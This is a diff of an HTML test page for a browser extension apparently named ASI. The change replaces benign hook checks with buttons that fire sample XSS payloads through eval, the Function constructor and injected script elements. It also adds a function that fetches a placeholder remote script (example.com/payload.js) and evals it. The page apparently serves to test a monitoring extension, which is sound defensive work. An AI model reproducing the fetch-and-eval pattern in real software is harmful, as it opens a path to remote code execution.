@@ -1,50 +1,45 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ASI Test</title>
+  <title>ASI Extension Test</title>
 </head>
 
 <body>
-  <h1>ASI Hook Testing Page</h1>
-  <button id="run">Run tests</button>
-  <pre id="output"></pre>
+  <h1>ASI Extension Testing</h1>
+  <p>Testing various XSS payloads...</p>
+
+  <button onclick="testEval()">Test: eval()</button>
+  <button onclick="testFunction()">Test: Function()</button>
+  <button onclick="testFetchEval()">Test: Fetch + Eval</button>
+  <button onclick="testMutation()">Test: DOM Mutation</button>
 
   <script>
-    // Small helper to show test progress in the page.
-    const out = document.querySelector('#output');
-    const log = (text) => { out.textContent += text + '\n'; };
+    function testEval() {
+      console.log('Testing eval...');
+      eval('alert("XSS via eval")');
+    }
 
-    // Runs one sample for each monitored API/hook.
-    document.getElementById('run').addEventListener('click', () => {
-      log('1. eval');
-      eval("console.log('done eval')");
+    function testFunction() {
+      console.log('Testing Function constructor...');
+      const fn = new Function('alert("XSS via Function")');
+      fn();
+    }
 
-      log('2. Function');
-      new Function("console.log('done Function')")();
+    function testFetchEval() {
+      console.log('Testing fetch + eval pattern...');
+      fetch('https://example.com/payload.js')
+        .then(r => r.text())
+        .then(code => eval(code))
+        .catch(e => console.log('Expected fetch failure:', e.message));
+    }
 
-      log('3. setTimeout string');
-      setTimeout("console.log('done setTimeout string')", 10);
-
-      log('4. createElement script');
-      const s = document.createElement('script');
-      s.textContent = "console.log('injected script')";
-      document.body.appendChild(s);
-
-      log('5. fetch');
-      fetch('https://httpbin.org/get').then(() => log('fetch done')).catch((e) => log('fetch fail ' + e));
-
-      log('6. XHR');
-      const xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://httpbin.org/get');
-      xhr.onload = () => log('xhr done');
-      xhr.onerror = () => log('xhr fail');
-      xhr.send();
-
-      log('done');
-    });
+    function testMutation() {
+      console.log('Testing DOM mutation...');
+      const script = document.createElement('script');
+      script.textContent = 'alert("XSS via mutation")';
+      document.body.appendChild(script);
+    }
   </script>
 </body>
 
